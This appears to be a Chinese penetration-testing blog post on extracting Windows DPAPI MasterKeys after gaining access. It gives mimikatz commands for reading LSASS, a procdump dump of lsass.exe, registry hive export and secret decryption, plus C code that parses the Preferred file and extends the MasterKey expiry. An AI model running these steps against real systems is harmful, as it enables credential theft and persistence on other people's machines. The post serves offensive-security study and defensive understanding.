---
layout: post
title: 渗透技巧——获取Windows系统下DPAPI中的MasterKey
---


## 0x00前言
---

对于Windows系统，用户的加密数据大都采用DPAPI进行存储，而想要解密这些数据解，必须要获得DPAPI对应的MasterKey。本文将会介绍在获得了Windows系统的权限后获得MasterKey的方法，同时分析Preferred文件格式，延长MasterKey的有效期

## 0x01 简介
---

本文将要介绍以下内容

- 基本概念
- 获得MasterKey的方法
- 解析Preferred文件
- 修改MasterKey失效时间

## 0x02 基本概念
---

#### DPAPI：

全称Data Protection Application Programming Interface

作为Windows系统的一个数据保护接口被广泛使用

主要用于保护加密的数据，常见的应用如：

- EFS文件加密
- 存储无线连接密码
- Windows Credential Manager
- Internet Explorer
- Outlook
- Skype
- Windows CardSpace
- Windows Vault
- Google Chrome

#### Master Key：

64字节，用于解密DPAPI blob，使用用户登录密码、SID和16字节随机数加密后保存在Master Key file中


#### Master Key file：

二进制文件，可使用用户登录密码对其解密，获得Master Key

分为两种：

- 用户Master Key file，位于%APPDATA%\Microsoft\Protect\%SID%
- 系统Master Key file，位于%WINDIR%\System32\Microsoft\Protect\S-1-5-18\User


#### Preferred文件：

位于Master Key file的同级目录，显示当前系统正在使用的MasterKey及其过期时间，默认90天有效期


## 0x03 获得MasterKey的方法
---

本节主要介绍通过mimikatz获得MasterKey的方法

### 1、在线获取

通过读取Lsass进程信息，获取当前系统中的MasterKey，能获得多个Master Key file对应的MasterKey

管理员权限：

```
privilege::debug
sekurlsa::dpapi
```

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-17/2-1.png)

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-17/2-2.png)


### 2、离线读取


#### 思路一：

使用procdump dump出LSASS进程内存

管理员权限：

```
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

使用mimikatz加载dmp文件并获取各个Master Key file对应的MasterKey：

```
sekurlsa::minidump lsass.dmp
sekurlsa::dpapi
```

#### 思路二：

参考资料：

https://github.com/gentilkiwi/mimikatz/wiki/howto-~-scheduled-tasks-credentials

1、复制注册表文件

管理员权限：

```
reg save HKLM\SYSTEM SystemBkup.hiv
reg save HKLM\SECURITY SECURITY.hiv
```

2、从注册表文件中获得DPAPI_SYSTEM

```
mimikatz log "lsadump::secrets /system:SystemBkup.hiv /security:SECURITY.hiv"
```

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-17/2-3.png)

DPAPI_SYSTEM中的user hash为`c2872cf6d6d4db31c6c8d33beb49b482e78e7ce3`，能够用来解密位于`%WINDIR%\System32\Microsoft\Protect\S-1-5-18\User`下的系统Master Key file

3、解密系统Master Key file，获得MasterKey

```
mimikatz "dpapi::masterkey /in:C:\Windows\System32\Microsoft\Protect\S-1-5-18\User\04ece708-132d-4bf0-a647-e3329269a012 /system:c2872cf6d6d4db31c6c8d33beb49b482e78e7ce3"
```

解密获得MasterKey为`3e9d7f32f2e57933ead318d075efc82325697d87d992b626a20abb5f0ffba6f073d282a837b6fa058ecff36039aa944e04b3dfb666ebace44aad6bff8789ca43`

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-17/2-4.png)


## 0x04 解析Preferred文件
---

位于Master Key file的同级目录，显示当前系统正在使用的MasterKey file及其过期时间

格式如下：

```
typedef struct _tagPreferredMasterKey
{
	GUID guidMasterKey;
	FILETIME ftCreated;
} PREFERREDMASTERKEY, *PPREFERREDMASTERKEY;
```

例如`C:\Users\b\AppData\Roaming\Microsoft\Protect\S-1-5-21-2884853959-2080156797-250722187-1002\Preferred`

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-17/3-1.png)

前16字节`F6 B0 11 A1 D7 B4 C8 40 B5 36 67 2A 82 88 B9 58`对应guid，调整格式后，对应文件为`a111b0f6-b4d7-40c8-b536-672a8288b958`

后8字节`D0 08 9F 7D 11 EC D3 01`对应过期时间

对于表示时间的FILETIME，格式如下：

```
typedef struct _FILETIME {  
                          DWORD dwLowDateTime;  
                          DWORD dwHighDateTime;  
} FILETIME, *PFILETIME;
```

想要显示成日常使用的时间格式，需要将FILETIME类型转成SYSTEMTIME类型

在程序实现上，还需要注意使用sscanf_s函数将字符串转换为DWORD格式

可供参考的C代码如下：

```
#include <windows.h>

int main(void)  
{  
	FILE *fp;  
	unsigned char buf[24];
    fopen_s(&fp,"Preferred","rb");  
    fread(buf,1,24,fp);
	printf("Data: ");
	for(int i=0;i<24;i++)
	{
		printf("%02x",buf[i]);
	}
	fclose(fp);

	printf("\nguidMasterKey: %02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x\n",buf[3],buf[2],buf[1],buf[0],buf[5],buf[4],buf[7],buf[6],buf[8],buf[9],buf[10],buf[11],buf[12],buf[13],buf[14],buf[15]);

	char lowDateTime[9],highDateTime[9];
	sprintf_s(lowDateTime,9,"%02X%02X%02X%02X",buf[19],buf[18],buf[17],buf[16]);
	sprintf_s(highDateTime,9,"%02X%02X%02X%02X",buf[23],buf[22],buf[21],buf[20]);

	printf("dwLowDateTime:%s\n",lowDateTime);
	printf("dwHighDateTime:%s\n",highDateTime);

	FILETIME        ftUTC;
	SYSTEMTIME      stUTC2;
	sscanf_s(lowDateTime,"%x",&ftUTC.dwLowDateTime);
	sscanf_s(highDateTime,"%x",&ftUTC.dwHighDateTime);
	FileTimeToSystemTime(&ftUTC, &stUTC2);  
	printf("");
	printf("Expiry time: %d-%d-%d %d:%d:%d\n", stUTC2.wYear, stUTC2.wMonth, stUTC2.wDay, stUTC2.wHour, stUTC2.wMinute, stUTC2.wSecond);  

	return 0;  
} 
```

**注：**

也可以使用fread读取int型数据来解决字符串倒序的问题

读取Preferred文件，解析出当前系统正在使用的Master Key file的guid和过期时间

测试如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-17/3-2.png)


## 0x05 修改MasterKey失效时间
---

修改思路：

输入过期时间，将过期时间转为FILETIME格式，替换Preferred文件的FILETIME

可供参考的c代码如下：

```
#include <windows.h>  
int main(void)  
{  
	SYSTEMTIME st={0};
	FILETIME   ft={0};
	printf("[+]Start to change expiry time...\n");	
	st.wYear = 2019;
	st.wMonth = 12;
	st.wDay = 30;
	st.wHour = 12;
	st.wMinute = 30;
	st.wSecond = 30;
	printf("[+]New expiry time:%d-%d-%d %d:%d:%d\n", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
	SystemTimeToFileTime(&st,&ft);
	printf("dwLowDateTime:%08x\n",ft.dwLowDateTime);
	printf("dwHighDateTime:%08x\n",ft.dwHighDateTime);

	FILE *fp;  
    fopen_s(&fp,"Preferred","rb+");  
	fseek(fp,16,SEEK_SET);
    fwrite(&ft.dwLowDateTime,sizeof(int),1,fp);
	fwrite(&ft.dwHighDateTime,sizeof(int),1,fp);
	fclose(fp);
	printf("[+]Change success.\n");
	return 0;  
} 
```

读取Preferred文件，将过期时间设置为`2019-12-30 12:30:30`

修改后重新读取Preferred文件信息，成功修改，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-17/3-3.png)


## 0x06 小结
---

本文总结了在获得了Windows系统的权限后获得MasterKey的方法，编写程序自动分析Preferred文件格式并延长MasterKey的有效期



---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)











